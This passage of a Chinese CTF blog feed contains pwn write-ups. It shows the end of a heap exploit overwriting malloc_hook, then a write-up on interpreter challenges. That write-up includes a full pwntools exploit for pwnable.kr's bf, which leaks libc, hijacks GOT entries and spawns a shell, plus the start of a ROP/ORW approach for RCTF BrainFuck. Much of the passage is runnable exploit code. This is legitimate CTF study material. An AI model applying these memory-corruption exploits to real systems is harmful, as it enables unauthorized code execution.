punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0x3</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>target<span class="token operator">+</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0x53</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'\x00'</span>data <span class="token operator">+=</span> <span class="token string">'\x99'</span>add<span class="token punctuation">(</span>data<span class="token punctuation">)</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvn<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>heap_base <span class="token operator">=</span> u32<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvn<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">"heap base => "</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>heap_base<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#get shell</span>fake_heap <span class="token operator">=</span> heap_base <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token number">0x56559aaf</span><span class="token operator">-</span><span class="token number">0x56559000</span><span class="token punctuation">)</span>fake_heap1 <span class="token operator">=</span> heap_base <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token number">0x56559abc</span><span class="token operator">-</span><span class="token number">0x56559000</span><span class="token punctuation">)</span>fake_heap2 <span class="token operator">=</span> heap_base <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token number">0x56559ac9</span><span class="token operator">-</span><span class="token number">0x56559000</span><span class="token punctuation">)</span>fake_heap3 <span class="token operator">=</span> heap_base <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token number">0x56559ad6</span><span class="token operator">-</span><span class="token number">0x56559000</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> p8<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>fake_heap<span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0x76</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>malloc_hook<span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0x54</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\x00"</span><span class="token keyword">print</span> hex<span class="token punctuation">(</span>fake_heap<span class="token punctuation">)</span>payload<span class="token operator">+=</span> p8<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>fake_heap1<span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0x76</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>malloc_hook<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0x54</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\x00"</span><span class="token keyword">print</span> hex<span class="token punctuation">(</span>fake_heap1<span class="token punctuation">)</span>payload<span class="token operator">+=</span> p8<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>fake_heap2<span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0x76</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>malloc_hook<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0x54</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\x00"</span><span class="token keyword">print</span> hex<span class="token punctuation">(</span>fake_heap2<span class="token punctuation">)</span>payload<span class="token operator">+=</span> p8<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>fake_heap3<span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0x76</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>malloc_hook<span class="token operator">+</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0x54</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\x00"</span><span class="token keyword">print</span> hex<span class="token punctuation">(</span>fake_heap3<span class="token punctuation">)</span>add<span class="token punctuation">(</span>payload<span class="token operator">+</span><span class="token string">"\x99"</span><span class="token punctuation">)</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>shell <span class="token operator">=</span> libc<span class="token punctuation">.</span>address <span class="token operator">+</span> gadgets<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>raw_input<span class="token punctuation">(</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p8<span class="token punctuation">(</span>shell<span class="token operator">&amp;</span><span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">)</span>raw_input<span class="token punctuation">(</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p8<span class="token punctuation">(</span><span class="token punctuation">(</span>shell<span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>raw_input<span class="token punctuation">(</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p8<span class="token punctuation">(</span><span class="token punctuation">(</span>shell<span class="token operator">&amp;</span><span class="token number">0xffffff</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span>raw_input<span class="token punctuation">(</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p8<span class="token punctuation">(</span>shell<span class="token operator">>></span><span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> VM-PWN总结 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>解释器类题目总结(一)</title>
      <link href="/2020/10/29/jie-shi-qi-lei-ti-mu-zong-jie-yi/"/>
      <url>/2020/10/29/jie-shi-qi-lei-ti-mu-zong-jie-yi/</url>
      
        <content type="html"><![CDATA[<h1 id="1-前言"><a href="#1-前言" class="headerlink" title="1.前言"></a>1.前言</h1><p>参考ERROR404师傅来对解释器类题目进行一个总结，整理题目如下：</p><ul><li><strong>Pwnable_bf</strong>：此题是利用了brainfuck本身的特性以及题目没有对GOT进行保护导致我们可以便捷的进行利用。</li><li><strong>2020 RCTF bf</strong>：此题是因为解释器的实现存在漏洞，并不是利用语言本身的特性。</li><li><strong>2020 DAS-CTF OJ0</strong>：此题是直接让我们写程序来读flag,而我们读flag时又需要绕过一些题目的过滤语句~</li><li><strong>DEFCON CTF Qualifier 2020 introool</strong>：此题严格来说并不是实现的解释器，但是它仍然是直接依据我们的输入来生成可执行文件，属于广义上的解释器。</li><li><strong>[Redhat2019] Kaleidoscope</strong>：此题创新性的使用了fuzz来解题。</li><li><strong>2020 DAS-CTF OJ1</strong>：此题仍然为直接让我们写程序来读flag,但是他限制了所有括号的使用！<br>bin文件和exp在文末<h1 id="2-基本介绍"><a href="#2-基本介绍" class="headerlink" title="2.基本介绍"></a>2.基本介绍</h1>解释器（英语Interpreter），又译为直译器，是一种电脑程序，能够把高级编程语言一行一行直接转译运行。解释器不会一次把整个程序转译出来，只像一位“中间人”，每次运行程序时都要先转成另一种语言再作运行，因此解释器的程序运行速度比较缓慢。它每转译一行程序叙述就立刻运行，然后再转译下一行，再运行，如此不停地进行下去。</li><li><em>实际上核心也是逆向，逆向出对应的符号代表的指令*</em><h1 id="3-题目"><a href="#3-题目" class="headerlink" title="3.题目"></a>3.题目</h1><h2 id="3-1-pwnable-bf"><a href="#3-1-pwnable-bf" class="headerlink" title="3.1 pwnable bf"></a>3.1 pwnable bf</h2><h3 id="3-1-1-查看文件"><a href="#3-1-1-查看文件" class="headerlink" title="3.1.1 查看文件"></a>3.1.1 查看文件</h3><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/29/jie-shi-qi-lei-ti-mu-zong-jie-yi/0.png"></div>可以看到got表的保护没有开启，同时PIE也没有开启。</li></ul><h3 id="3-1-2-IDA分析"><a href="#3-1-2-IDA分析" class="headerlink" title="3.1.2 IDA分析"></a>3.1.2 IDA分析</h3><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/29/jie-shi-qi-lei-ti-mu-zong-jie-yi/1.png"></div>很清晰的看到任意地址读写，只不过是一个一个的读写而已<h3 id="3-1-3-思路"><a href="#3-1-3-思路" class="headerlink" title="3.1.3 思路"></a>3.1.3 思路</h3><p>思路很容易就想到劫持got表，先越界leak出libc地址，再改got表。<br>    其实具体思路想了半天，开始还是踩了坑的。最开始尝试将/bin/sh写入bss中，同时改putschar为system。发现这个是byte类的函数，意思就是执行system(“/“)。。。。第二次又是将got表改为one_gadget。<br>最后思路出炉：</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/29/jie-shi-qi-lei-ti-mu-zong-jie-yi/2.png"></div>**第一步：将puts地址泄露，找到system地址第二步：将putchar函数got表改为start地址第三步：将memset got表改为gets函数第四步：将fgets got表改为system函数**<h3 id="3-1-4-exp"><a href="#3-1-4-exp" class="headerlink" title="3.1.4 exp"></a>3.1.4 exp</h3><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding=utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span>debug <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./bf"</span><span class="token punctuation">)</span>    elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./bf"</span><span class="token punctuation">)</span>    libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./bf_libc.so"</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"pwnable.kr"</span><span class="token punctuation">,</span><span class="token number">9001</span><span class="token punctuation">)</span>    elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./bf"</span><span class="token punctuation">)</span>    libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./bf_libc.so"</span><span class="token punctuation">)</span>one_gadgets <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x3ac5c</span><span class="token punctuation">,</span><span class="token number">0x3ac5e</span><span class="token punctuation">,</span><span class="token number">0x3ac62</span><span class="token punctuation">,</span><span class="token number">0x3ac69</span><span class="token punctuation">,</span><span class="token number">0x5fbc5</span><span class="token punctuation">,</span><span class="token number">0x5fbc6</span><span class="token punctuation">]</span>start_address <span class="token operator">=</span> <span class="token number">0x804a080</span>puts_got <span class="token operator">=</span> <span class="token number">0x804a018</span>putchar_got <span class="token operator">=</span> <span class="token number">0x0804a030</span>strlen_got <span class="token operator">=</span> <span class="token number">0x0804a020</span>fgets_get <span class="token operator">=</span> <span class="token number">0x804a010</span>memset_got <span class="token operator">=</span> <span class="token number">0x804a02c</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"except [ ]"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#---leak libc---</span>payload <span class="token operator">=</span><span class="token string">'&lt;'</span><span class="token operator">*</span><span class="token number">0x88</span>payload<span class="token operator">+=</span><span class="token string">'.'</span>payload<span class="token operator">+=</span><span class="token string">'>'</span>payload<span class="token operator">+=</span><span class="token string">'.'</span>payload<span class="token operator">+=</span><span class="token string">'>'</span>payload<span class="token operator">+=</span><span class="token string">'.'</span>payload<span class="token operator">+=</span><span class="token string">'>'</span>payload<span class="token operator">+=</span><span class="token string">'.'</span><span class="token comment" spellcheck="true">#---modify putchar got start----</span>payload<span class="token operator">+=</span><span class="token string">'['</span>payload<span class="token operator">+=</span><span class="token string">'>'</span><span class="token operator">*</span><span class="token number">0x15</span>payload<span class="token operator">+=</span><span class="token string">','</span>payload<span class="token operator">+=</span><span class="token string">'>'</span>payload<span class="token operator">+=</span><span class="token string">','</span>payload<span class="token operator">+=</span><span class="token string">'>'</span>payload<span class="token operator">+=</span><span class="token string">','</span>payload<span class="token operator">+=</span><span class="token string">'>'</span>payload<span class="token operator">+=</span><span class="token string">','</span><span class="token comment" spellcheck="true"># modify fgets to system</span>payload<span class="token operator">+=</span><span class="token string">'['</span>payload<span class="token operator">+=</span><span class="token string">'&lt;'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x20</span><span class="token operator">+</span><span class="token number">3</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span><span class="token string">','</span>payload<span class="token operator">+=</span><span class="token string">'>'</span>payload<span class="token operator">+=</span><span class="token string">','</span>payload<span class="token operator">+=</span><span class="token string">'>'</span>payload<span class="token operator">+=</span><span class="token string">','</span>payload<span class="token operator">+=</span><span class="token string">'>'</span>payload<span class="token operator">+=</span><span class="token string">','</span><span class="token comment" spellcheck="true">#modify memset to gets</span>payload<span class="token operator">+=</span><span class="token string">'['</span>payload<span class="token operator">+=</span><span class="token string">'>'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x1c</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span><span class="token string">','</span>payload<span class="token operator">+=</span><span class="token string">'>'</span>payload<span class="token operator">+=</span><span class="token string">','</span>payload<span class="token operator">+=</span><span class="token string">'>'</span>payload<span class="token operator">+=</span><span class="token string">','</span>payload<span class="token operator">+=</span><span class="token string">'>'</span>payload<span class="token operator">+=</span><span class="token string">','</span>payload<span class="token operator">+=</span><span class="token string">'.'</span><span class="token comment" spellcheck="true"># gdb.attach(p)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>libc<span class="token punctuation">.</span>address <span class="token operator">=</span> u32<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>success<span class="token punctuation">(</span><span class="token string">"libc address ==> "</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>chr<span class="token punctuation">(</span><span class="token number">0xe0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>chr<span class="token punctuation">(</span><span class="token number">0x84</span><span class="token punctuation">)</span><span class="token punctuation">)</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>chr<span class="token punctuation">(</span><span class="token number">0x04</span><span class="token punctuation">)</span><span class="token punctuation">)</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>chr<span class="token punctuation">(</span><span class="token number">0x08</span><span class="token punctuation">)</span><span class="token punctuation">)</span>raw_input<span class="token punctuation">(</span><span class="token punctuation">)</span>hack_addr <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span>addr_1 <span class="token operator">=</span> hack_addr <span class="token operator">%</span> <span class="token number">0x100</span>addr_2 <span class="token operator">=</span> <span class="token punctuation">(</span>hack_addr <span class="token operator">>></span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">0x100</span>addr_3 <span class="token operator">=</span> <span class="token punctuation">(</span>hack_addr <span class="token operator">>></span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">0x100</span>addr_4 <span class="token operator">=</span> hack_addr <span class="token operator">>></span> <span class="token number">24</span>gets_addr <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"gets"</span><span class="token punctuation">]</span>gets_addr_1 <span class="token operator">=</span> gets_addr <span class="token operator">%</span> <span class="token number">0x100</span>gets_addr_2 <span class="token operator">=</span> <span class="token punctuation">(</span>gets_addr <span class="token operator">>></span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">0x100</span>gets_addr_3 <span class="token operator">=</span> <span class="token punctuation">(</span>gets_addr <span class="token operator">>></span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">0x100</span>gets_addr_4 <span class="token operator">=</span> gets_addr <span class="token operator">>></span> <span class="token number">24</span>sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"supported.\n"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>chr<span class="token punctuation">(</span>addr_1<span class="token punctuation">)</span><span class="token punctuation">)</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>chr<span class="token punctuation">(</span>addr_2<span class="token punctuation">)</span><span class="token punctuation">)</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>chr<span class="token punctuation">(</span>addr_3<span class="token punctuation">)</span><span class="token punctuation">)</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>chr<span class="token punctuation">(</span>addr_4<span class="token punctuation">)</span><span class="token punctuation">)</span>raw_input<span class="token punctuation">(</span><span class="token punctuation">)</span>sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"supported.\n"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>chr<span class="token punctuation">(</span>gets_addr_1<span class="token punctuation">)</span><span class="token punctuation">)</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>chr<span class="token punctuation">(</span>gets_addr_2<span class="token punctuation">)</span><span class="token punctuation">)</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>chr<span class="token punctuation">(</span>gets_addr_3<span class="token punctuation">)</span><span class="token punctuation">)</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>chr<span class="token punctuation">(</span>gets_addr_4<span class="token punctuation">)</span><span class="token punctuation">)</span>raw_input<span class="token punctuation">(</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"except [ ]\n"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3-2-RCTF-BrainFuck"><a href="#3-2-RCTF-BrainFuck" class="headerlink" title="3.2 RCTF BrainFuck"></a>3.2 RCTF BrainFuck</h2><h3 id="3-2-1-查看文件"><a href="#3-2-1-查看文件" class="headerlink" title="3.2.1 查看文件"></a>3.2.1 查看文件</h3><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/29/jie-shi-qi-lei-ti-mu-zong-jie-yi/3.png"></div>保护全开同时也开启了沙箱：<div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/29/jie-shi-qi-lei-ti-mu-zong-jie-yi/4.png"></div>看这个可调用函数的情况应该是想ORW来获得flag吧<h3 id="3-2-2-IDA分析"><a href="#3-2-2-IDA分析" class="headerlink" title="3.2.2 IDA分析"></a>3.2.2 IDA分析</h3><p>C++实现的，逆向有一些困难，通过百度找到brainFuck语言，找到指令对应的关系</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/29/jie-shi-qi-lei-ti-mu-zong-jie-yi/5.png"></div><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/29/jie-shi-qi-lei-ti-mu-zong-jie-yi/6.png"></div>我们看到p++、p--的时候分别都有栈保护机制开启的再后面会打印出你的code：<div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/29/jie-shi-qi-lei-ti-mu-zong-jie-yi/7.png"></div>符号对应指令：```&gt;  == ++ptr &lt; == --ptr + == ++(*ptr) - == --(*ptr) . == putchar(*ptr) , == *ptr = == getchar() [ == while (*ptr) { ] == }```### 3.2.3 思路我们看到code的长度是0x400字节长度，下面存放的就是code的地址，好了我们开始测试：利用这样一段指令：+[&gt;.+],``` c(*ptr++);while(*ptr){    ptr++;    putchar(ptr);    (*ptr++);}getchar(ptr);```这段指令会执行0x400次，我们断点到执行getchar的地方：执行getchar前：<div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/29/jie-shi-qi-lei-ti-mu-zong-jie-yi/8.png"></div>红框是代码的位置：<div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/29/jie-shi-qi-lei-ti-mu-zong-jie-yi/9.png"></div>执行后：（我们输入a）<div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/29/jie-shi-qi-lei-ti-mu-zong-jie-yi/10.png"></div>code地址已经被我们改为0x61了。由于后面会输出改地址对应的内容，那么就很容易leak libc地址。(程序返回地址就是libc地址）<p>这样的话就很容易想到改code地址为ret地址，再写入rop来orw读取flag。</p><p>因为后面输入继续的话，code地址就是修改的地址，那么下次直接从这里（程序返回地址）开始写rop就可以了，但是还有一个问题就是我们需要还原code地址，也就是说需要再触发一次off by one来还原code_addr，这段代码我们跟在rop后面，由于解析到ret地址的时候会是一大片rop，但是由于里面没有我们可以解析的指令，所以会一直++循环到我们输入触发off by one的指令，这样就可以将code_addr改回来了。</p><h3 id="3-2-4-exp"><a href="#3-2-4-exp" class="headerlink" title="3.2.4 exp"></a>3.2.4 exp</h3><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding=utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>r <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">:</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>rl <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>ru <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">,</span>x<span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>x<span class="token punctuation">)</span>rn <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">,</span>x<span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvn<span class="token punctuation">(</span>x<span class="token punctuation">)</span>rud <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">,</span>x<span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>x<span class="token punctuation">,</span>drop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>s <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">,</span>x<span class="token punctuation">:</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>x<span class="token punctuation">)</span>sl <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">,</span>x<span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>x<span class="token punctuation">)</span>sla <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">,</span>x<span class="token punctuation">,</span>y<span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span>sa <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">,</span>x<span class="token punctuation">,</span>y<span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span>context<span class="token punctuation">.</span>update<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>log_level<span class="token operator">=</span><span class="token string">'DEBUG'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'split'</span><span class="token punctuation">,</span><span class="token 